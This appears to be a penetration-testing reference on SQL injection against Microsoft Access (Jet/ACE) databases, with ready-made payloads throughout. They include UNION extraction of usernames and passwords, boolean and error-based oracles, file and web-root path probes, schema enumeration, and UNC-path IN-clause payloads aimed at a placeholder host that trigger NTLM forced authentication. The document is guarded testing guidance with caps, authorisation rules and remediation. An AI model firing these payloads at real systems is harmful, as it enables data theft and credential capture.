# MS Access (Jet / ACE) injection

The Access dialect is different enough that a standard SQL payload set returns
nothing against a genuinely injectable parameter, which is why these findings get
closed as false positives. Everything below is a dialect difference, not a
technique: get the syntax right and the ordinary boolean-oracle methodology from
the main skill applies unchanged.

Where you meet it: Classic ASP on IIS, legacy intranet applications promoted to
an external host, small vendor appliances, and anything whose connection string
names an `.mdb` or `.accdb` file. A `Microsoft JET Database Engine` or
`Microsoft Access Database Engine` string in an error body is the fingerprint.

**Cadence.** Serial, 1.5s base plus up to 1.5s jitter. Caps per parameter: 20
Stage A requests, 150 oracle characters, 10 timing trials. Nothing in this file
writes, and nothing in it should.

---

## The seven dialect differences that break standard payloads

### 1. No comment syntax

Jet/ACE has no `--`, no `#` and no `/* */`. Two replacements:

```sql
-- Truncate the remainder with a NUL byte
1' UNION SELECT 1,2 FROM <valid_table>%00

-- Or close the developer's quote yourself, so the trailing syntax stays valid
1' UNION SELECT 1,2 FROM <valid_table> WHERE ''='
```

The `WHERE ''='` tail is the workhorse. Keep it in every payload and the
original query's closing quote lands harmlessly.

### 2. No stacked queries

Semicolon-chained statements are not supported. There is no `; DROP`, no
`; EXEC`, and no second statement of any kind. This is also why Access
injection has no command-execution path, and why the realistic ceiling is data
disclosure.

### 3. `UNION` works, but every subquery needs a real `FROM`

`UNION` and `UNION ALL` are available. The constraint is that Access requires a
`FROM` naming an **existing** table in any subquery or additional query, so a
bare `' UNION SELECT NULL--` cannot work no matter how many NULLs you add.

```sql
-1' UNION SELECT username,password FROM users%00
```

That makes finding a valid table name the first task rather than the second, and
it inverts the column-count-first ordering used for MySQL and PostgreSQL in the
main skill. Use the brute-force oracle in section 6 to find a table name before
spending requests on column counts.

### 4. No `LIMIT`

`TOP n` returns the first n rows and `LAST` returns from the end. Combining them
addresses one row at a time, which is how row-by-row extraction is done here:

```sql
1' UNION SELECT TOP 3 <col> FROM <valid_table>%00

-- Address row 10 only: take the top 10, then the last of those.
(SELECT LAST(<col>) FROM (SELECT TOP 10 <col> FROM <valid_table>))
```

### 5. String concatenation uses `&` and `+`

Both work. URL-encode them (`%26` and `%2b`) so the query-string parser does not
eat them:

```sql
1' UNION SELECT 'web' %2b 'app' FROM <valid_table>%00
1' UNION SELECT 'web' %26 'app' FROM <valid_table>%00
```

### 6. Chained equality is the boolean oracle

Access accepts expressions such as `'1'=2='3'='asd'=false`. Because the
injection usually sits in a `WHERE`, that quirk gives a self-contained oracle
that needs no known table name:

```sql
-- Does the current table have a column called `username`, and does it start "adm"?
'=(Mid(username,1,3)='adm')='

-- Column-name existence in the current table
'=column_name='
-1' GROUP BY column_name%00

-- Table-name existence
'=(select top 1 'x' from <table_name>)='
-1' AND (SELECT TOP 1 <table_name>)%00

-- Column-name existence in a different, known table
'=(SELECT TOP 1 column_name FROM <valid_table_name>)='
```

Word lists for the brute force: sqlmap ships
`data/txt/common-tables.txt` and `data/txt/common-columns.txt`, which are the
right starting point. Respect the 150-character cap per parameter and stop as
soon as one differential is proven: a single confirmed column name is the
finding, and a full dump is not needed to report it.

### 7. `IIf` instead of `CASE`, and `Mid` instead of `SUBSTRING`

```sql
IIf((SELECT Mid(LAST(<col>),1,1) FROM (SELECT TOP 10 <col> FROM <valid_table>))='a',0,'ko')
```

The payload returns `0` on a match and the string `'ko'` otherwise. Where the
surrounding query expects a number, the `'ko'` branch raises a type error, so a
200 against a 500 becomes the oracle. Useful function set:

| Function | Meaning |
|---|---|
| `Mid('admin',1,1)` | Substring. **Position is 1-based, not 0-based.** |
| `LEN('1234')` | String length |
| `ASC('A')` | Character to ASCII value |
| `CHR(65)` | ASCII value to character |
| `IIF(1=1,'a','b')` | Inline conditional |
| `COUNT(*)` | Row count |
| `TOP n` / `LAST` | Row addressing |

---

## Wildcards depend on the provider, not on Access

This is the detail that wastes the most time. Microsoft's documentation states
that "the ANSI SQL wildcards (%) and (_) are only available with Microsoft Jet
version 4.X and the Microsoft OLE DB Provider for Jet. They will be treated as
literals if used through Microsoft Access or DAO."

| Access mode | Any single character | Zero or more characters |
|---|---|---|
| ANSI-89, reached through Access or DAO | `?` | `*` |
| ANSI-92, reached through the OLE DB provider or ADO | `_` | `%` |

The classic ASP path (ADO over the Jet or ACE OLE DB provider) is the ANSI-92
case, so `%` and `_` are correct there. A VBA or DAO-backed application is the
ANSI-89 case, and a `%` sent to it matches a literal percent sign and returns
nothing. **Try both and let the responses decide**; do not assume from the file
extension. Access also supports `#` for any single digit and `[charlist]` /
`[!charlist]` character classes, which neither ANSI mode offers.

---

## Timing: there is no `SLEEP`

Jet/ACE exposes no native `SLEEP()` or `WAITFOR`. The only delay primitive is to
make the engine open a remote database over the network, because it tries to
open the file before returning a result:

```sql
-- Stage B. Gated: this reaches a second host. See the two guards below.
' UNION SELECT 1 FROM <valid_table> IN '\\192.0.2.10\nonexistent\x.mdb' WHERE ''='
```

Pointing that at an address that drops the TCP handshake, a firewall sinkhole or
a host that never answers produces a measurable delay, which turns into a
boolean oracle by selecting the slow path only when the injected predicate is
true.

**Two guards, and neither is optional.**

First, **this is Stage B, not Stage A**, even though it extracts no data. The
UNC target is a different host from the injection target, so it is the same
separate authorization question as `dblink` in `postgresql-escalation.md`: a
second written answer naming the destination, before the first request. Point it
at your own infrastructure and nowhere else.

Second, the destination must be a **drop or non-answering address**, never a
listening SMB share. A share that answers receives the web server's forced
authentication, and capturing or relaying that is excluded from this bundle (see
the forced-authentication section below). A sinkhole gives the same latency
signal with nothing to capture.

Then cap trials at 10 per parameter and run them serially: each one holds a
worker thread on the target for the full timeout, and a parallel burst of these
is a denial of service against an IIS application pool.

Microsoft documents the remote-database behaviour and its registry kill switch in
[KB5002984](https://support.microsoft.com/en-gb/topic/kb5002984-configuring-jet-red-database-engine-and-access-connectivity-engine-to-block-access-to-remote-databases-56406821-30f3-475c-a492-208b9bd30544),
which sets `AllowQueryRemoteTables = 0`. That is also the remediation to put in
the report.

---

## Error-differential oracles that need no data access

All three read nothing and write nothing. They exploit the fact that Access
reports a *different* error for a file that exists than for one that does not.

```sql
-- Web root absolute path disclosure: select from a database that cannot exist.
1'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00
-- Access replies with an error containing the full directory path.

-- File-existence oracle: an existing file yields "invalid database format".
1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00
1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00

-- .mdb filename guessing: valid and invalid filenames error differently.
1'+UNION+SELECT+1+FROM+<candidate_name>.<realTable>%00
```

---

## Schema enumeration via `MSysObjects`

When the application's connection has read access to the system catalogue, the
whole schema comes out in one query:

```sql
SELECT MSysObjects.name
FROM MSysObjects
WHERE MSysObjects.type In (1,4,6)
  AND MSysObjects.name NOT LIKE '~*'
  AND MSysObjects.name NOT LIKE 'MSys*'
ORDER BY MSysObjects.name
```

Read access to `MSysObjects` is denied more often than not, and its absence is
not evidence against the injection. Fall back to the chained-equality brute force
in section 6.

---

## Forced authentication over the `IN` clause

Since Jet 4.0 any query can reference a table in a different `.mdb`/`.accdb`
file through `IN '<path>'`:

```sql
SELECT <col> FROM <table> IN '\\192.0.2.10\share\hr.accdb';
```

If user input reaches the part after `IN` (or a `JOIN ... IN`), an attacker can
name a UNC path on a host they control and the engine will attempt to
authenticate to it. The in-scope finding ends at **"outbound SMB from the web
server is reachable and database-side forced authentication is possible"**.
Describe that impact and stop. Capturing or relaying the resulting
authentication is excluded from this bundle. Check Point Research revisited the
vector in 2023 and showed it still works on a fully patched Windows Server when
the registry key from KB5002984 is absent.

---

## Never send these

- `UPDATE`, `INSERT`, `DELETE` or any DDL. Access applications are frequently
  backed by a single file with no backup and no transaction log worth the name.
- A UNC path pointing anywhere other than infrastructure you own.
- A parallel burst of the remote-table timing payload.
- A malformed remote database file. Jet/ACE parser bugs have been patched
  repeatedly (for example
  [CVE-2021-28455](https://nvd.nist.gov/vuln/detail/CVE-2021-28455)), and
  feeding the engine a crafted file is a memory-corruption attempt, not a
  read-only proof.

---

## Root causes

1. A Classic ASP or VBA codebase that predates parameterised ADO commands, with
   query strings built by `&`.
2. An Access file used as a production database because the application started
   as a desktop tool, so there is no database-level privilege model to lean on.
3. A connection string naming a share, which makes the `IN` clause reachable.
4. Verbose IIS error pages left on, which is what turns every oracle above from
   blind into visible.

---

## Sources

- Microsoft:
  [using wildcard characters in string comparisons](https://learn.microsoft.com/en-us/office/client-developer/access/desktop-database-reference/using-wildcard-characters-in-string-comparisons)
  for the ANSI-89 against ANSI-92 wildcard split;
  [KB5002984](https://support.microsoft.com/en-gb/topic/kb5002984-configuring-jet-red-database-engine-and-access-connectivity-engine-to-block-access-to-remote-databases-56406821-30f3-475c-a492-208b9bd30544)
  for remote-table blocking.
- [nibblesec MS Access SQL injection cheat sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
  for the error-differential file and path oracles.
- [Check Point Research, abusing Access linked tables for NTLM forced authentication (2023)](https://research.checkpoint.com/2023/abusing-microsoft-access-linked-table-feature-to-perform-ntlm-forced-authentication-attacks/).
- [dataedo, listing tables in an Access database](https://dataedo.com/kb/query/access/list-of-tables-in-the-database)
  for the `MSysObjects` query shape.
- Coverage of the technique list was checked against the HackTricks
  `pentesting-web/sql-injection/ms-access-sql-injection` page
  (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a
  checklist only. All prose, the provider-mode wildcard table, staging and
  safety guidance here is written against the Microsoft documentation linked
  above.
